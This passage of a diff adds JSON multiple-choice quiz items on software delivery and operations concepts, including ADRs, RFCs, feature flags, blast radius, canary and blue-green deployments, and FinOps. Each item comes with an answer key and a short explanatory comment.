+    "title": "Architecture Decision Record (ADR)",
+    "options": {
+      "a": "A regulatory compliance audit required annually for financial software architectures under PCI-DSS.",
+      "b": "A short text document capturing an important architectural decision, its context, considered options, and consequences.",
+      "c": "A database schema log automatically recorded by Prisma or Flyway during migrations.",
+      "d": "A performance benchmark report generated after running automated load tests on microservices."
+    },
+    "answer": "b",
+    "postanswer": "// ADR Structure (e.g. docs/adr/0014-use-kafka-for-events.md):\n// # 14. Use Apache Kafka for Domain Event Bus\n// - Status: Accepted\n// - Context: Current RabbitMQ broker struggling with 50,000 msg/sec and lacks event replay capability.\n// - Decision: Adopt Apache Kafka for all inter-service event publishing.\n// - Consequences: Enables independent event replays; requires team training on partition keys and consumer group offsets."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Request for Comments (RFC)",
+    "options": {
+      "a": "A customer feedback survey sent to users after closing technical support tickets.",
+      "b": "An automated GitHub bot that posts reminders on pull requests lacking reviewer approval.",
+      "c": "A collaborative engineering proposal document used to gather feedback, align stakeholders, and debate technical trade-offs before implementation.",
+      "d": "An HTTP header specification used to submit user comments to web blogging engines."
+    },
+    "answer": "c",
+    "postanswer": "// Senior SWE RFC Lifecycle:\n// 1. Identify high-impact architectural problem or cross-team initiative.\n// 2. Draft RFC: Problem statement, goals/non-goals, proposed architecture, alternatives considered, security/cost implications.\n// 3. Solicit async feedback from staff engineers, security, and affected teams.\n// 4. Resolve trade-offs, achieve consensus, and commit the plan before writing thousands of lines of wasted code."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Shift-Left Testing",
+    "options": {
+      "a": "A testing philosophy where quality assurance engineers write code while developers perform manual testing.",
+      "b": "Migrating automated test suites from right-to-left language localizations (e.g. Arabic or Hebrew).",
+      "c": "Prioritizing end-to-end browser UI tests over lower-level unit and integration test suites.",
+      "d": "Moving testing, security checks, and quality assurance earlier in the software development lifecycle rather than testing at the end."
+    },
+    "answer": "d",
+    "postanswer": "// Shift-Left in CI/CD:\n// Traditional (Shift-Right): Code -> Build -> Deploy to Staging -> QA tests manually -> Bugs found weeks late (Expensive!).\n// Shift-Left:\n// - Static analysis & linters run on pre-commit hook.\n// - Security scanning (SAST / dependency audit) runs on Pull Request.\n// - Comprehensive unit & contract tests run in seconds in CI.\n// Cost to fix a bug in development: 1x. Cost to fix a bug in production: 100x."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Trunk-Based Development vs GitFlow",
+    "options": {
+      "a": "Trunk-based development involves frequent merges of small branches into a single shared trunk; GitFlow relies on long-lived feature, release, and develop branches.",
+      "b": "Trunk-based development is used for SVN repositories, while GitFlow is used exclusively for Git repositories.",
+      "c": "Trunk-based development eliminates version control branching completely in favor of direct production editing.",
+      "d": "GitFlow is designed for continuous deployment, while trunk-based development is designed for annual packaged software releases."
+    },
+    "answer": "a",
+    "postanswer": "// Branching Strategy Comparison:\n// - GitFlow:\n//   Feature Branch -> develop branch -> release branch -> main/master branch\n//   Pain: Massive merge conflicts ('merge hell'), delayed integration, slow release cadence.\n// - Trunk-Based Development (Modern Standard):\n//   Engineers branch off main, write short-lived branches (< 1-2 days), merge frequently via PR.\n//   Unfinished features hidden behind Feature Flags.\n//   Enables continuous integration and rapid delivery."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Feature Flags (Feature Toggles)",
+    "options": {
+      "a": "Compiler flags passed to gcc/clang to enable experimental hardware optimizations during build time.",
+      "b": "A software engineering technique that allows features to be modified or toggled on/off at runtime without deploying new code.",
+      "c": "Database constraints that enable or disable table foreign key checks during batch imports.",
+      "d": "Configuration options in operating system kernels that allocate virtual memory swap space."
+    },
+    "answer": "b",
+    "postanswer": "// Feature Flag in Practice:\n// if (featureFlags.isEnabled('new-checkout-flow', user.id)) {\n//   return renderStripeCheckout();\n// } else {\n//   return renderLegacyCheckout();\n// }\n// Superpowers:\n// 1. Decouples code deployment from feature release.\n// 2. Canary rollouts: Enable for 1% of users, monitor errors, ramp to 100%.\n// 3. Instant kill-switch: Disable immediately if production errors spike without rolling back code."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Blast Radius",
+    "options": {
+      "a": "The number of lines of code modified by an automated code formatting script across a Git repository.",
+      "b": "The physical radius around a corporate data center where cell phone signals are jammed for security.",
+      "c": "The maximum extent of damage, impact, or failure that can be caused across a system when a particular component fails.",
+      "d": "The total network latency incurred when an HTTP request traverses multiple cloud regions."
+    },
+    "answer": "c",
+    "postanswer": "// Minimizing Blast Radius in Architecture:\n// High Blast Radius (Anti-pattern):\n// - Single shared database for all 25 microservices.\n// - Bad query locks database -> Entire company goes offline.\n// Low Blast Radius:\n// - Cell-based architecture or regional sharding.\n// - Independent data stores per domain.\n// - If 'Recommendations' fails, user can still search, add to cart, and checkout."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Bus Factor",
+    "options": {
+      "a": "The maximum bandwidth of the motherboard memory bus connecting the CPU to physical RAM.",
+      "b": "The number of engineers permitted to travel together on company retreat charter buses.",
+      "c": "The throughput capacity of the internal event bus measured in megabytes per second.",
+      "d": "The minimum number of team members that can be hit by a bus (or leave the team) before a project stalls due to lost knowledge."
+    },
+    "answer": "d",
+    "postanswer": "// Bus Factor / Key Person Dependency:\n// If Alice is the ONLY engineer who understands the core billing settlement engine:\n// - Bus Factor = 1 (Extremely dangerous organizational risk!).\n// Remedies for Senior Engineers:\n// 1. Maintain comprehensive architecture docs and runbooks.\n// 2. Rotate critical system ownership and on-call duties.\n// 3. Conduct pair programming and shared code reviews."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Dark Launching",
+    "options": {
+      "a": "Releasing a feature to production by sending production traffic to backend servers without exposing user-facing UI elements to assess performance and stability.",
+      "b": "Deploying code updates secretly during the middle of the night without logging deployment timestamps.",
+      "c": "Hosting web applications on the dark web (Tor network) to prevent DDoS attacks.",
+      "d": "Deploying uncompiled source code directly to production servers to bypass CI/CD testing pipelines."
+    },
+    "answer": "a",
+    "postanswer": "// Dark Launching Architecture:\n// User clicks 'Search' on existing frontend.\n// Frontend calls /api/search (Production response returned to user).\n// Backend gateway asynchronously duplicates (shadows) request to NEW experimental /api/v2/search.\n// - New algorithm processes real production load and concurrency.\n// - Response is compared for correctness and latency in logs, but NOT shown to user.\n// Validates capacity, cache hits, and correctness with zero customer risk."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Canary vs Blue-Green Deployments",
+    "options": {
+      "a": "Canary is used for frontend apps, while Blue-Green is used exclusively for database migrations.",
+      "b": "Canary routes a small percentage of real traffic to the new version before ramping up; Blue-Green switches 100% of traffic between two identical production environments.",
+      "c": "Canary deployments require manual server reboots, while Blue-Green deployments run exclusively on Kubernetes.",
+      "d": "Blue-Green is a security testing framework, while Canary is a performance benchmarking tool."
+    },
+    "answer": "b",
+    "postanswer": "// Deployment Strategies:\n// - Canary Deployment:\n//   Version 1.0 (98% of users) | Version 1.1 (2% of users)\n//   Monitor error rate & latency on canary. If healthy -> 10% -> 50% -> 100%.\n// - Blue-Green Deployment:\n//   Environment BLUE (Active, 100% traffic)\n//   Environment GREEN (Idle, deploy new version 1.1 here, run smoke tests)\n//   Router switches 100% traffic from Blue to Green instantly.\n//   Instant rollback possible by switching back to Blue."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "FinOps & Cloud Unit Economics",
+    "options": {
+      "a": "An accounting software integration that exports AWS billing invoices to QuickBooks.",
+      "b": "A cryptocurrency payment processing protocol used in modern decentralized ecommerce platforms.",
+      "c": "The operational practice of bringing financial accountability to cloud spend, measuring infrastructure costs against business output metrics (e.g. cost per active user).",
+      "d": "A cloud architecture that eliminates server costs by running all computational workloads on client browsers."
+    },
+    "answer": "c",
+    "postanswer": "// FinOps & Unit Economics:\n// Raw metric: 'Our AWS bill increased from $50,000 to $75,000 this month!' (Panicked CFO!)\n// Senior SWE Unit Metric:\n// - Month 1: $50,000 / 100,000 orders = $0.50 infrastructure cost per order.\n// - Month 2: $75,000 / 200,000 orders = $0.37 infrastructure cost per order.\n// Conclusion: Cloud efficiency improved by 26% despite higher total bill! Enables smart architectural decisions."
+  },
+  {
+    "category": "Delivery, Operations & Strategy",
+    "title": "Spike / Proof of Concept (PoC)",
+    "options": {
+      "a": "A critical production bug ticket that bypasses standard sprint planning and interrupts on-call engineers.",
+      "b": "A temporary CPU usage burst permitted on AWS burstable t3/t4g server instances.",
+      "c": "A sudden, unpredicted surge in user traffic that triggers automated horizontal pod autoscaling.",
+      "d": "A timeboxed investigation or prototype aimed at answering a specific technical question, reducing uncertainty, and exploring feasibility before committing to an architecture."
+    },
+    "answer": "d",
+    "postanswer": "// Senior SWE Spike Framework:\n// Goal: 'Can we replace our Redis cache with AWS MemoryDB while maintaining < 2ms p99 latency?'\n// Timebox: Strict 2-day limit.\n// Rules:\n// 1. Write throwaway experimental code (do not polish unit tests or clean architecture).\n// 2. Measure specific quantitative criteria.\n// 3. Output: An Architecture Decision Record (ADR) or RFC with empirical data to guide team decision."
+  }
+]
